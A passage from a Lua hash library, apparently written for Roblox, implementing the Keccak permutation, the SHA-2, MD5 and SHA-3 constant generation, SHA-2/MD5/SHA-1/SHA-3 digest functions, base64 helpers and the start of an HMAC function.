			L19_lo = (T4_lo % TWO_POW_32 - T4_lo % TWO_POW_8) / TWO_POW_8 + T4_hi * TWO_POW_24 % TWO_POW_32
			L19_hi = (T4_hi % TWO_POW_32 - T4_hi % TWO_POW_8) / TWO_POW_8 + T4_lo * TWO_POW_24 % TWO_POW_32
			L24_lo = (T1_lo % TWO_POW_32 - T1_lo % TWO_POW_9) / TWO_POW_9 + T1_hi * TWO_POW_23 % TWO_POW_32
			L24_hi = (T1_hi % TWO_POW_32 - T1_hi % TWO_POW_9) / TWO_POW_9 + T1_lo * TWO_POW_23 % TWO_POW_32

			D_lo = bit32_bxor(C4_lo, C1_lo * 2 + (C1_hi % TWO_POW_32 - C1_hi % TWO_POW_31) / TWO_POW_31)
			D_hi = bit32_bxor(C4_hi, C1_hi * 2 + (C1_lo % TWO_POW_32 - C1_lo % TWO_POW_31) / TWO_POW_31)

			T0_lo = bit32_bxor(D_lo, L05_lo)
			T0_hi = bit32_bxor(D_hi, L05_hi)
			T1_lo = bit32_bxor(D_lo, L10_lo)
			T1_hi = bit32_bxor(D_hi, L10_hi)
			T2_lo = bit32_bxor(D_lo, L15_lo)
			T2_hi = bit32_bxor(D_hi, L15_hi)
			T3_lo = bit32_bxor(D_lo, L20_lo)
			T3_hi = bit32_bxor(D_hi, L20_hi)
			T4_lo = bit32_bxor(D_lo, L25_lo)
			T4_hi = bit32_bxor(D_hi, L25_hi)

			L05_lo = T4_lo * TWO_POW_14 + (T4_hi % TWO_POW_32 - T4_hi % TWO_POW_18) / TWO_POW_18
			L05_hi = T4_hi * TWO_POW_14 + (T4_lo % TWO_POW_32 - T4_lo % TWO_POW_18) / TWO_POW_18
			L10_lo = T1_lo * TWO_POW_20 % TWO_POW_32 + (T1_hi % TWO_POW_32 - T1_hi % TWO_POW_12) / TWO_POW_12
			L10_hi = T1_hi * TWO_POW_20 % TWO_POW_32 + (T1_lo % TWO_POW_32 - T1_lo % TWO_POW_12) / TWO_POW_12
			L15_lo = T3_lo * TWO_POW_8 + (T3_hi % TWO_POW_32 - T3_hi % TWO_POW_24) / TWO_POW_24
			L15_hi = T3_hi * TWO_POW_8 + (T3_lo % TWO_POW_32 - T3_lo % TWO_POW_24) / TWO_POW_24
			L20_lo = T0_lo * TWO_POW_27 % TWO_POW_32 + (T0_hi % TWO_POW_32 - T0_hi % TWO_POW_5) / TWO_POW_5
			L20_hi = T0_hi * TWO_POW_27 % TWO_POW_32 + (T0_lo % TWO_POW_32 - T0_lo % TWO_POW_5) / TWO_POW_5
			L25_lo = (T2_lo % TWO_POW_32 - T2_lo % TWO_POW_25) / TWO_POW_25 + T2_hi * TWO_POW_7
			L25_hi = (T2_hi % TWO_POW_32 - T2_hi % TWO_POW_25) / TWO_POW_25 + T2_lo * TWO_POW_7

			D_lo = bit32_bxor(C5_lo, C2_lo * 2 + (C2_hi % TWO_POW_32 - C2_hi % TWO_POW_31) / TWO_POW_31)
			D_hi = bit32_bxor(C5_hi, C2_hi * 2 + (C2_lo % TWO_POW_32 - C2_lo % TWO_POW_31) / TWO_POW_31)

			T1_lo = bit32_bxor(D_lo, L06_lo)
			T1_hi = bit32_bxor(D_hi, L06_hi)
			T2_lo = bit32_bxor(D_lo, L11_lo)
			T2_hi = bit32_bxor(D_hi, L11_hi)
			T3_lo = bit32_bxor(D_lo, L16_lo)
			T3_hi = bit32_bxor(D_hi, L16_hi)
			T4_lo = bit32_bxor(D_lo, L21_lo)
			T4_hi = bit32_bxor(D_hi, L21_hi)

			L06_lo = T2_lo * TWO_POW_3 + (T2_hi % TWO_POW_32 - T2_hi % TWO_POW_29) / TWO_POW_29
			L06_hi = T2_hi * TWO_POW_3 + (T2_lo % TWO_POW_32 - T2_lo % TWO_POW_29) / TWO_POW_29
			L11_lo = T4_lo * TWO_POW_18 + (T4_hi % TWO_POW_32 - T4_hi % TWO_POW_14) / TWO_POW_14
			L11_hi = T4_hi * TWO_POW_18 + (T4_lo % TWO_POW_32 - T4_lo % TWO_POW_14) / TWO_POW_14
			L16_lo = (T1_lo % TWO_POW_32 - T1_lo % TWO_POW_28) / TWO_POW_28 + T1_hi * TWO_POW_4
			L16_hi = (T1_hi % TWO_POW_32 - T1_hi % TWO_POW_28) / TWO_POW_28 + T1_lo * TWO_POW_4
			L21_lo = (T3_lo % TWO_POW_32 - T3_lo % TWO_POW_23) / TWO_POW_23 + T3_hi * TWO_POW_9
			L21_hi = (T3_hi % TWO_POW_32 - T3_hi % TWO_POW_23) / TWO_POW_23 + T3_lo * TWO_POW_9

			L01_lo = bit32_bxor(D_lo, L01_lo)
			L01_hi = bit32_bxor(D_hi, L01_hi)
			L01_lo, L02_lo, L03_lo, L04_lo, L05_lo = bit32_bxor(L01_lo, bit32_band(-1 - L02_lo, L03_lo)), bit32_bxor(L02_lo, bit32_band(-1 - L03_lo, L04_lo)), bit32_bxor(L03_lo, bit32_band(-1 - L04_lo, L05_lo)), bit32_bxor(L04_lo, bit32_band(-1 - L05_lo, L01_lo)), bit32_bxor(L05_lo, bit32_band(-1 - L01_lo, L02_lo))
			L01_hi, L02_hi, L03_hi, L04_hi, L05_hi = bit32_bxor(L01_hi, bit32_band(-1 - L02_hi, L03_hi)), bit32_bxor(L02_hi, bit32_band(-1 - L03_hi, L04_hi)), bit32_bxor(L03_hi, bit32_band(-1 - L04_hi, L05_hi)), bit32_bxor(L04_hi, bit32_band(-1 - L05_hi, L01_hi)), bit32_bxor(L05_hi, bit32_band(-1 - L01_hi, L02_hi))
			L06_lo, L07_lo, L08_lo, L09_lo, L10_lo = bit32_bxor(L09_lo, bit32_band(-1 - L10_lo, L06_lo)), bit32_bxor(L10_lo, bit32_band(-1 - L06_lo, L07_lo)), bit32_bxor(L06_lo, bit32_band(-1 - L07_lo, L08_lo)), bit32_bxor(L07_lo, bit32_band(-1 - L08_lo, L09_lo)), bit32_bxor(L08_lo, bit32_band(-1 - L09_lo, L10_lo))
			L06_hi, L07_hi, L08_hi, L09_hi, L10_hi = bit32_bxor(L09_hi, bit32_band(-1 - L10_hi, L06_hi)), bit32_bxor(L10_hi, bit32_band(-1 - L06_hi, L07_hi)), bit32_bxor(L06_hi, bit32_band(-1 - L07_hi, L08_hi)), bit32_bxor(L07_hi, bit32_band(-1 - L08_hi, L09_hi)), bit32_bxor(L08_hi, bit32_band(-1 - L09_hi, L10_hi))
			L11_lo, L12_lo, L13_lo, L14_lo, L15_lo = bit32_bxor(L12_lo, bit32_band(-1 - L13_lo, L14_lo)), bit32_bxor(L13_lo, bit32_band(-1 - L14_lo, L15_lo)), bit32_bxor(L14_lo, bit32_band(-1 - L15_lo, L11_lo)), bit32_bxor(L15_lo, bit32_band(-1 - L11_lo, L12_lo)), bit32_bxor(L11_lo, bit32_band(-1 - L12_lo, L13_lo))
			L11_hi, L12_hi, L13_hi, L14_hi, L15_hi = bit32_bxor(L12_hi, bit32_band(-1 - L13_hi, L14_hi)), bit32_bxor(L13_hi, bit32_band(-1 - L14_hi, L15_hi)), bit32_bxor(L14_hi, bit32_band(-1 - L15_hi, L11_hi)), bit32_bxor(L15_hi, bit32_band(-1 - L11_hi, L12_hi)), bit32_bxor(L11_hi, bit32_band(-1 - L12_hi, L13_hi))
			L16_lo, L17_lo, L18_lo, L19_lo, L20_lo = bit32_bxor(L20_lo, bit32_band(-1 - L16_lo, L17_lo)), bit32_bxor(L16_lo, bit32_band(-1 - L17_lo, L18_lo)), bit32_bxor(L17_lo, bit32_band(-1 - L18_lo, L19_lo)), bit32_bxor(L18_lo, bit32_band(-1 - L19_lo, L20_lo)), bit32_bxor(L19_lo, bit32_band(-1 - L20_lo, L16_lo))
			L16_hi, L17_hi, L18_hi, L19_hi, L20_hi = bit32_bxor(L20_hi, bit32_band(-1 - L16_hi, L17_hi)), bit32_bxor(L16_hi, bit32_band(-1 - L17_hi, L18_hi)), bit32_bxor(L17_hi, bit32_band(-1 - L18_hi, L19_hi)), bit32_bxor(L18_hi, bit32_band(-1 - L19_hi, L20_hi)), bit32_bxor(L19_hi, bit32_band(-1 - L20_hi, L16_hi))
			L21_lo, L22_lo, L23_lo, L24_lo, L25_lo = bit32_bxor(L23_lo, bit32_band(-1 - L24_lo, L25_lo)), bit32_bxor(L24_lo, bit32_band(-1 - L25_lo, L21_lo)), bit32_bxor(L25_lo, bit32_band(-1 - L21_lo, L22_lo)), bit32_bxor(L21_lo, bit32_band(-1 - L22_lo, L23_lo)), bit32_bxor(L22_lo, bit32_band(-1 - L23_lo, L24_lo))
			L21_hi, L22_hi, L23_hi, L24_hi, L25_hi = bit32_bxor(L23_hi, bit32_band(-1 - L24_hi, L25_hi)), bit32_bxor(L24_hi, bit32_band(-1 - L25_hi, L21_hi)), bit32_bxor(L25_hi, bit32_band(-1 - L21_hi, L22_hi)), bit32_bxor(L21_hi, bit32_band(-1 - L22_hi, L23_hi)), bit32_bxor(L22_hi, bit32_band(-1 - L23_hi, L24_hi))
			L01_lo = bit32_bxor(L01_lo, RC_lo[round_idx])
			L01_hi = L01_hi + RC_hi[round_idx] -- RC_hi[] is either 0 or 0x80000000, so we could use fast addition instead of slow XOR
		end

		lanes_lo[1] = L01_lo
		lanes_hi[1] = L01_hi
		lanes_lo[2] = L02_lo
		lanes_hi[2] = L02_hi
		lanes_lo[3] = L03_lo
		lanes_hi[3] = L03_hi
		lanes_lo[4] = L04_lo
		lanes_hi[4] = L04_hi
		lanes_lo[5] = L05_lo
		lanes_hi[5] = L05_hi
		lanes_lo[6] = L06_lo
		lanes_hi[6] = L06_hi
		lanes_lo[7] = L07_lo
		lanes_hi[7] = L07_hi
		lanes_lo[8] = L08_lo
		lanes_hi[8] = L08_hi
		lanes_lo[9] = L09_lo
		lanes_hi[9] = L09_hi
		lanes_lo[10] = L10_lo
		lanes_hi[10] = L10_hi
		lanes_lo[11] = L11_lo
		lanes_hi[11] = L11_hi
		lanes_lo[12] = L12_lo
		lanes_hi[12] = L12_hi
		lanes_lo[13] = L13_lo
		lanes_hi[13] = L13_hi
		lanes_lo[14] = L14_lo
		lanes_hi[14] = L14_hi
		lanes_lo[15] = L15_lo
		lanes_hi[15] = L15_hi
		lanes_lo[16] = L16_lo
		lanes_hi[16] = L16_hi
		lanes_lo[17] = L17_lo
		lanes_hi[17] = L17_hi
		lanes_lo[18] = L18_lo
		lanes_hi[18] = L18_hi
		lanes_lo[19] = L19_lo
		lanes_hi[19] = L19_hi
		lanes_lo[20] = L20_lo
		lanes_hi[20] = L20_hi
		lanes_lo[21] = L21_lo
		lanes_hi[21] = L21_hi
		lanes_lo[22] = L22_lo
		lanes_hi[22] = L22_hi
		lanes_lo[23] = L23_lo
		lanes_hi[23] = L23_hi
		lanes_lo[24] = L24_lo
		lanes_hi[24] = L24_hi
		lanes_lo[25] = L25_lo
		lanes_hi[25] = L25_hi
	end
end

--------------------------------------------------------------------------------
-- MAGIC NUMBERS CALCULATOR
--------------------------------------------------------------------------------
-- Q:
--    Is 53-bit "double" math enough to calculate square roots and cube roots of primes with 64 correct bits after decimal point?
-- A:
--    Yes, 53-bit "double" arithmetic is enough.
--    We could obtain first 40 bits by direct calculation of p^(1/3) and next 40 bits by one step of Newton's method.
do
	local function mul(src1, src2, factor, result_length)
		-- src1, src2 - long integers (arrays of digits in base TWO_POW_24)
		-- factor - small integer
		-- returns long integer result (src1 * src2 * factor) and its floating point approximation
		local result, carry, value, weight = table.create(result_length), 0, 0, 1
		for j = 1, result_length do
			for k = math.max(1, j + 1 - #src2), math.min(j, #src1) do
				carry = carry + factor * src1[k] * src2[j + 1 - k] -- "int32" is not enough for multiplication result, that's why "factor" must be of type "double"
			end

			local digit = carry % TWO_POW_24
			result[j] = math.floor(digit)
			carry = (carry - digit) / TWO_POW_24
			value = value + digit * weight
			weight = weight * TWO_POW_24
		end

		return result, value
	end

	local idx, step, p, one, sqrt_hi, sqrt_lo = 0, {4, 1, 2, -2, 2}, 4, {1}, sha2_H_hi, sha2_H_lo
	repeat
		p = p + step[p % 6]
		local d = 1
		repeat
			d = d + step[d % 6]
			if d * d > p then
				-- next prime number is found
				local root = p ^ (1 / 3)
				local R = root * TWO_POW_40
				R = mul(table.create(1, math.floor(R)), one, 1, 2)
				local _, delta = mul(R, mul(R, R, 1, 4), -1, 4)
				local hi = R[2] % 65536 * 65536 + math.floor(R[1] / 256)
				local lo = R[1] % 256 * 16777216 + math.floor(delta * (TWO_POW_NEG_56 / 3) * root / p)

				if idx < 16 then
					root = math.sqrt(p)
					R = root * TWO_POW_40
					R = mul(table.create(1, math.floor(R)), one, 1, 2)
					_, delta = mul(R, R, -1, 2)
					local hi = R[2] % 65536 * 65536 + math.floor(R[1] / 256)
					local lo = R[1] % 256 * 16777216 + math.floor(delta * TWO_POW_NEG_17 / root)
					local idx = idx % 8 + 1
					sha2_H_ext256[224][idx] = lo
					sqrt_hi[idx], sqrt_lo[idx] = hi, lo + hi * hi_factor
					if idx > 7 then
						sqrt_hi, sqrt_lo = sha2_H_ext512_hi[384], sha2_H_ext512_lo[384]
					end
				end

				idx = idx + 1
				sha2_K_hi[idx], sha2_K_lo[idx] = hi, lo % K_lo_modulo + hi * hi_factor
				break
			end
		until p % d == 0
	until idx > 79
end

-- Calculating IVs for SHA512/224 and SHA512/256
for width = 224, 256, 32 do
	local H_lo, H_hi = {}, nil
	if XOR64A5 then
		for j = 1, 8 do
			H_lo[j] = XOR64A5(sha2_H_lo[j])
		end
	else
		H_hi = {}
		for j = 1, 8 do
			H_lo[j] = bit32_bxor(sha2_H_lo[j], 0xA5A5A5A5) % 4294967296
			H_hi[j] = bit32_bxor(sha2_H_hi[j], 0xA5A5A5A5) % 4294967296
		end
	end

	sha512_feed_128(H_lo, H_hi, "SHA-512/" .. tostring(width) .. "\128" .. string.rep("\0", 115) .. "\88", 0, 128)
	sha2_H_ext512_lo[width] = H_lo
	sha2_H_ext512_hi[width] = H_hi
end

-- Constants for MD5
do
	for idx = 1, 64 do
		-- we can't use formula math.floor(abs(sin(idx))*TWO_POW_32) because its result may be beyond integer range on Lua built with 32-bit integers
		local hi, lo = math.modf(math.abs(math.sin(idx)) * TWO_POW_16)
		md5_K[idx] = hi * 65536 + math.floor(lo * TWO_POW_16)
	end
end

-- Constants for SHA3
do
	local sh_reg = 29
	local function next_bit()
		local r = sh_reg % 2
		sh_reg = bit32_bxor((sh_reg - r) / 2, 142 * r)
		return r
	end

	for idx = 1, 24 do
		local lo, m = 0, nil
		for _ = 1, 6 do
			m = m and m * m * 2 or 1
			lo = lo + next_bit() * m
		end

		local hi = next_bit() * m
		sha3_RC_hi[idx], sha3_RC_lo[idx] = hi, lo + hi * hi_factor_keccak
	end
end

--------------------------------------------------------------------------------
-- MAIN FUNCTIONS
--------------------------------------------------------------------------------
local function sha256ext(width, message)
	-- Create an instance (private objects for current calculation)
	local Array256 = sha2_H_ext256[width] -- # == 8
	local length, tail = 0, ""
	local H = table.create(8)
	H[1], H[2], H[3], H[4], H[5], H[6], H[7], H[8] = Array256[1], Array256[2], Array256[3], Array256[4], Array256[5], Array256[6], Array256[7], Array256[8]

	local function partial(message_part)
		if message_part then
			local partLength = #message_part
			if tail then
				length = length + partLength
				local offs = 0
				local tailLength = #tail
				if tail ~= "" and tailLength + partLength >= 64 then
					offs = 64 - tailLength
					sha256_feed_64(H, tail .. string.sub(message_part, 1, offs), 0, 64)
					tail = ""
				end

				local size = partLength - offs
				local size_tail = size % 64
				sha256_feed_64(H, message_part, offs, size - size_tail)
				tail = tail .. string.sub(message_part, partLength + 1 - size_tail)
				return partial
			else
				error("Adding more chunks is not allowed after receiving the result", 2)
			end
		else
			if tail then
				local final_blocks = table.create(10) --{tail, "\128", string.rep("\0", (-9 - length) % 64 + 1)}
				final_blocks[1] = tail
				final_blocks[2] = "\128"
				final_blocks[3] = string.rep("\0", (-9 - length) % 64 + 1)

				tail = nil
				-- Assuming user data length is shorter than (TWO_POW_53)-9 bytes
				-- Anyway, it looks very unrealistic that someone would spend more than a year of calculations to process TWO_POW_53 bytes of data by using this Lua script :-)
				-- TWO_POW_53 bytes = TWO_POW_56 bits, so "bit-counter" fits in 7 bytes
				length = length * (8 / TWO56_POW_7) -- convert "byte-counter" to "bit-counter" and move decimal point to the left
				for j = 4, 10 do
					length = length % 1 * 256
					final_blocks[j] = string.char(math.floor(length))
				end

				final_blocks = table.concat(final_blocks)
				sha256_feed_64(H, final_blocks, 0, #final_blocks)
				local max_reg = width / 32
				for j = 1, max_reg do
					H[j] = string.format("%08x", H[j] % 4294967296)
				end

				H = table.concat(H, "", 1, max_reg)
			end

			return H
		end
	end

	if message then
		-- Actually perform calculations and return the SHA256 digest of a message
		return partial(message)()
	else
		-- Return function for chunk-by-chunk loading
		-- User should feed every chunk of input data as single argument to this function and finally get SHA256 digest by invoking this function without an argument
		return partial
	end
end

local function sha512ext(width, message)

	-- Create an instance (private objects for current calculation)
	local length, tail, H_lo, H_hi = 0, "", table.pack(table.unpack(sha2_H_ext512_lo[width])), not HEX64 and table.pack(table.unpack(sha2_H_ext512_hi[width]))

	local function partial(message_part)
		if message_part then
			local partLength = #message_part
			if tail then
				length = length + partLength
				local offs = 0
				if tail ~= "" and #tail + partLength >= 128 then
					offs = 128 - #tail
					sha512_feed_128(H_lo, H_hi, tail .. string.sub(message_part, 1, offs), 0, 128)
					tail = ""
				end

				local size = partLength - offs
				local size_tail = size % 128
				sha512_feed_128(H_lo, H_hi, message_part, offs, size - size_tail)
				tail = tail .. string.sub(message_part, partLength + 1 - size_tail)
				return partial
			else
				error("Adding more chunks is not allowed after receiving the result", 2)
			end
		else
			if tail then
				local final_blocks = table.create(3) --{tail, "\128", string.rep("\0", (-17-length) % 128 + 9)}
				final_blocks[1] = tail
				final_blocks[2] = "\128"
				final_blocks[3] = string.rep("\0", (-17 - length) % 128 + 9)

				tail = nil
				-- Assuming user data length is shorter than (TWO_POW_53)-17 bytes
				-- TWO_POW_53 bytes = TWO_POW_56 bits, so "bit-counter" fits in 7 bytes
				length = length * (8 / TWO56_POW_7) -- convert "byte-counter" to "bit-counter" and move floating point to the left
				for j = 4, 10 do
					length = length % 1 * 256
					final_blocks[j] = string.char(math.floor(length))
				end

				final_blocks = table.concat(final_blocks)
				sha512_feed_128(H_lo, H_hi, final_blocks, 0, #final_blocks)
				local max_reg = math.ceil(width / 64)

				if HEX64 then
					for j = 1, max_reg do
						H_lo[j] = HEX64(H_lo[j])
					end
				else
					for j = 1, max_reg do
						H_lo[j] = string.format("%08x", H_hi[j] % 4294967296) .. string.format("%08x", H_lo[j] % 4294967296)
					end

					H_hi = nil
				end

				H_lo = string.sub(table.concat(H_lo, "", 1, max_reg), 1, width / 4)
			end

			return H_lo
		end
	end

	if message then
		-- Actually perform calculations and return the SHA512 digest of a message
		return partial(message)()
	else
		-- Return function for chunk-by-chunk loading
		-- User should feed every chunk of input data as single argument to this function and finally get SHA512 digest by invoking this function without an argument
		return partial
	end
end

local function md5(message)

	-- Create an instance (private objects for current calculation)
	local H, length, tail = table.create(4), 0, ""
	H[1], H[2], H[3], H[4] = md5_sha1_H[1], md5_sha1_H[2], md5_sha1_H[3], md5_sha1_H[4]

	local function partial(message_part)
		if message_part then
			local partLength = #message_part
			if tail then
				length = length + partLength
				local offs = 0
				if tail ~= "" and #tail + partLength >= 64 then
					offs = 64 - #tail
					md5_feed_64(H, tail .. string.sub(message_part, 1, offs), 0, 64)
					tail = ""
				end

				local size = partLength - offs
				local size_tail = size % 64
				md5_feed_64(H, message_part, offs, size - size_tail)
				tail = tail .. string.sub(message_part, partLength + 1 - size_tail)
				return partial
			else
				error("Adding more chunks is not allowed after receiving the result", 2)
			end
		else
			if tail then
				local final_blocks = table.create(3) --{tail, "\128", string.rep("\0", (-9 - length) % 64)}
				final_blocks[1] = tail
				final_blocks[2] = "\128"
				final_blocks[3] = string.rep("\0", (-9 - length) % 64)
				tail = nil
				length = length * 8 -- convert "byte-counter" to "bit-counter"
				for j = 4, 11 do
					local low_byte = length % 256
					final_blocks[j] = string.char(low_byte)
					length = (length - low_byte) / 256
				end

				final_blocks = table.concat(final_blocks)
				md5_feed_64(H, final_blocks, 0, #final_blocks)
				for j = 1, 4 do
					H[j] = string.format("%08x", H[j] % 4294967296)
				end

				H = string.gsub(table.concat(H), "(..)(..)(..)(..)", "%4%3%2%1")
			end

			return H
		end
	end

	if message then
		-- Actually perform calculations and return the MD5 digest of a message
		return partial(message)()
	else
		-- Return function for chunk-by-chunk loading
		-- User should feed every chunk of input data as single argument to this function and finally get MD5 digest by invoking this function without an argument
		return partial
	end
end

local function sha1(message)
	-- Create an instance (private objects for current calculation)
	local H, length, tail = table.pack(table.unpack(md5_sha1_H)), 0, ""

	local function partial(message_part)
		if message_part then
			local partLength = #message_part
			if tail then
				length = length + partLength
				local offs = 0
				if tail ~= "" and #tail + partLength >= 64 then
					offs = 64 - #tail
					sha1_feed_64(H, tail .. string.sub(message_part, 1, offs), 0, 64)
					tail = ""
				end

				local size = partLength - offs
				local size_tail = size % 64
				sha1_feed_64(H, message_part, offs, size - size_tail)
				tail = tail .. string.sub(message_part, partLength + 1 - size_tail)
				return partial
			else
				error("Adding more chunks is not allowed after receiving the result", 2)
			end
		else
			if tail then
				local final_blocks = table.create(10) --{tail, "\128", string.rep("\0", (-9 - length) % 64 + 1)}
				final_blocks[1] = tail
				final_blocks[2] = "\128"
				final_blocks[3] = string.rep("\0", (-9 - length) % 64 + 1)
				tail = nil

				-- Assuming user data length is shorter than (TWO_POW_53)-9 bytes
				-- TWO_POW_53 bytes = TWO_POW_56 bits, so "bit-counter" fits in 7 bytes
				length = length * (8 / TWO56_POW_7) -- convert "byte-counter" to "bit-counter" and move decimal point to the left
				for j = 4, 10 do
					length = length % 1 * 256
					final_blocks[j] = string.char(math.floor(length))
				end

				final_blocks = table.concat(final_blocks)
				sha1_feed_64(H, final_blocks, 0, #final_blocks)
				for j = 1, 5 do
					H[j] = string.format("%08x", H[j] % 4294967296)
				end

				H = table.concat(H)
			end

			return H
		end
	end

	if message then
		-- Actually perform calculations and return the SHA-1 digest of a message
		return partial(message)()
	else
		-- Return function for chunk-by-chunk loading
		-- User should feed every chunk of input data as single argument to this function and finally get SHA-1 digest by invoking this function without an argument
		return partial
	end
end

local function keccak(block_size_in_bytes, digest_size_in_bytes, is_SHAKE, message)
	-- "block_size_in_bytes" is multiple of 8
	if type(digest_size_in_bytes) ~= "number" then
		-- arguments in SHAKE are swapped:
		--    NIST FIPS 202 defines SHAKE(message,num_bits)
		--    this module   defines SHAKE(num_bytes,message)
		-- it's easy to forget about this swap, hence the check
		error("Argument 'digest_size_in_bytes' must be a number", 2)
	end

	-- Create an instance (private objects for current calculation)
	local tail, lanes_lo, lanes_hi = "", table.create(25, 0), hi_factor_keccak == 0 and table.create(25, 0)
	local result

	--~     pad the input N using the pad function, yielding a padded bit string P with a length divisible by r (such that n = len(P)/r is integer),
	--~     break P into n consecutive r-bit pieces P0, ..., Pn-1 (last is zero-padded)
	--~     initialize the state S to a string of b 0 bits.
	--~     absorb the input into the state: For each block Pi,
	--~         extend Pi at the end by a string of c 0 bits, yielding one of length b,
	--~         XOR that with S and
	--~         apply the block permutation f to the result, yielding a new state S
	--~     initialize Z to be the empty string
	--~     while the length of Z is less than d:
	--~         append the first r bits of S to Z
	--~         if Z is still less than d bits long, apply f to S, yielding a new state S.
	--~     truncate Z to d bits
	local function partial(message_part)
		if message_part then
			local partLength = #message_part
			if tail then
				local offs = 0
				if tail ~= "" and #tail + partLength >= block_size_in_bytes then
					offs = block_size_in_bytes - #tail
					keccak_feed(lanes_lo, lanes_hi, tail .. string.sub(message_part, 1, offs), 0, block_size_in_bytes, block_size_in_bytes)
					tail = ""
				end

				local size = partLength - offs
				local size_tail = size % block_size_in_bytes
				keccak_feed(lanes_lo, lanes_hi, message_part, offs, size - size_tail, block_size_in_bytes)
				tail = tail .. string.sub(message_part, partLength + 1 - size_tail)
				return partial
			else
				error("Adding more chunks is not allowed after receiving the result", 2)
			end
		else
			if tail then
				-- append the following bits to the message: for usual SHA3: 011(0*)1, for SHAKE: 11111(0*)1
				local gap_start = is_SHAKE and 31 or 6
				tail = tail .. (#tail + 1 == block_size_in_bytes and string.char(gap_start + 128) or string.char(gap_start) .. string.rep("\0", (-2 - #tail) % block_size_in_bytes) .. "\128")
				keccak_feed(lanes_lo, lanes_hi, tail, 0, #tail, block_size_in_bytes)
				tail = nil

				local lanes_used = 0
				local total_lanes = math.floor(block_size_in_bytes / 8)
				local qwords = {}

				local function get_next_qwords_of_digest(qwords_qty)
					-- returns not more than 'qwords_qty' qwords ('qwords_qty' might be non-integer)
					-- doesn't go across keccak-buffer boundary
					-- block_size_in_bytes is a multiple of 8, so, keccak-buffer contains integer number of qwords
					if lanes_used >= total_lanes then
						keccak_feed(lanes_lo, lanes_hi, "\0\0\0\0\0\0\0\0", 0, 8, 8)
						lanes_used = 0
					end

					qwords_qty = math.floor(math.min(qwords_qty, total_lanes - lanes_used))
					if hi_factor_keccak ~= 0 then
						for j = 1, qwords_qty do
							qwords[j] = HEX64(lanes_lo[lanes_used + j - 1 + lanes_index_base])
						end
					else
						for j = 1, qwords_qty do
							qwords[j] = string.format("%08x", lanes_hi[lanes_used + j] % 4294967296) .. string.format("%08x", lanes_lo[lanes_used + j] % 4294967296)
						end
					end

					lanes_used = lanes_used + qwords_qty
					return string.gsub(table.concat(qwords, "", 1, qwords_qty), "(..)(..)(..)(..)(..)(..)(..)(..)", "%8%7%6%5%4%3%2%1"), qwords_qty * 8
				end

				local parts = {} -- digest parts
				local last_part, last_part_size = "", 0

				local function get_next_part_of_digest(bytes_needed)
					-- returns 'bytes_needed' bytes, for arbitrary integer 'bytes_needed'
					bytes_needed = bytes_needed or 1
					if bytes_needed <= last_part_size then
						last_part_size = last_part_size - bytes_needed
						local part_size_in_nibbles = bytes_needed * 2
						local result = string.sub(last_part, 1, part_size_in_nibbles)
						last_part = string.sub(last_part, part_size_in_nibbles + 1)
						return result
					end

					local parts_qty = 0
					if last_part_size > 0 then
						parts_qty = 1
						parts[parts_qty] = last_part
						bytes_needed = bytes_needed - last_part_size
					end

					-- repeats until the length is enough
					while bytes_needed >= 8 do
						local next_part, next_part_size = get_next_qwords_of_digest(bytes_needed / 8)
						parts_qty = parts_qty + 1
						parts[parts_qty] = next_part
						bytes_needed = bytes_needed - next_part_size
					end

					if bytes_needed > 0 then
						last_part, last_part_size = get_next_qwords_of_digest(1)
						parts_qty = parts_qty + 1
						parts[parts_qty] = get_next_part_of_digest(bytes_needed)
					else
						last_part, last_part_size = "", 0
					end

					return table.concat(parts, "", 1, parts_qty)
				end

				if digest_size_in_bytes < 0 then
					result = get_next_part_of_digest
				else
					result = get_next_part_of_digest(digest_size_in_bytes)
				end

			end

			return result
		end
	end

	if message then
		-- Actually perform calculations and return the SHA3 digest of a message
		return partial(message)()
	else
		-- Return function for chunk-by-chunk loading
		-- User should feed every chunk of input data as single argument to this function and finally get SHA3 digest by invoking this function without an argument
		return partial
	end
end

local function HexToBinFunction(hh)
	return string.char(tonumber(hh, 16))
end

local function hex2bin(hex_string)
	return (string.gsub(hex_string, "%x%x", HexToBinFunction))
end

local base64_symbols = {
	["+"] = 62, ["-"] = 62, [62] = "+";
	["/"] = 63, ["_"] = 63, [63] = "/";
	["="] = -1, ["."] = -1, [-1] = "=";
}

local symbol_index = 0
for j, pair in ipairs{"AZ", "az", "09"} do
	for ascii = string.byte(pair), string.byte(pair, 2) do
		local ch = string.char(ascii)
		base64_symbols[ch] = symbol_index
		base64_symbols[symbol_index] = ch
		symbol_index = symbol_index + 1
	end
end

local function bin2base64(binary_string)
	local stringLength = #binary_string
	local result = table.create(math.ceil(stringLength / 3))
	local length = 0

	for pos = 1, #binary_string, 3 do
		local c1, c2, c3, c4 = string.byte(string.sub(binary_string, pos, pos + 2) .. '\0', 1, -1)
		length = length + 1
		result[length] =
			base64_symbols[math.floor(c1 / 4)] ..
			base64_symbols[c1 % 4 * 16 + math.floor(c2 / 16)] ..
			base64_symbols[c3 and c2 % 16 * 4 + math.floor(c3 / 64) or -1] ..
			base64_symbols[c4 and c3 % 64 or -1]
	end

	return table.concat(result)
end

local function base642bin(base64_string)
	local result, chars_qty = {}, 3
	for pos, ch in string.gmatch(string.gsub(base64_string, "%s+", ""), "()(.)") do
		local code = base64_symbols[ch]
		if code < 0 then
			chars_qty = chars_qty - 1
			code = 0
		end

		local idx = pos % 4
		if idx > 0 then
			result[-idx] = code
		else
			local c1 = result[-1] * 4 + math.floor(result[-2] / 16)
			local c2 = (result[-2] % 16) * 16 + math.floor(result[-3] / 4)
			local c3 = (result[-3] % 4) * 64 + code
			result[#result + 1] = string.sub(string.char(c1, c2, c3), 1, chars_qty)
		end
	end

	return table.concat(result)
end

local block_size_for_HMAC -- this table will be initialized at the end of the module
--local function pad_and_xor(str, result_length, byte_for_xor)
--	return string.gsub(str, ".", function(c)
--		return string.char(bit32_bxor(string.byte(c), byte_for_xor))
--	end) .. string.rep(string.char(byte_for_xor), result_length - #str)
--end

-- For the sake of speed of converting hexes to strings, there's a map of the conversions here
local BinaryStringMap = {}
for Index = 0, 255 do
	BinaryStringMap[string.format("%02x", Index)] = string.char(Index)
end

-- Update 02.14.20 - added AsBinary for easy GameAnalytics replacement.
local function hmac(hash_func, key, message, AsBinary)
	-- Create an instance (private objects for current calculation)
	local block_size = block_size_for_HMAC[hash_func]
	if not block_size then
		error("Unknown hash function", 2)
	end

	local KeyLength = #key
	if KeyLength > block_size then
		key = string.gsub(hash_func(key), "%x%x", HexToBinFunction)
		KeyLength = #key
	end

	local append = hash_func()(string.gsub(key, ".", function(c)
		return string.char(bit32_bxor(string.byte(c), 0x36))
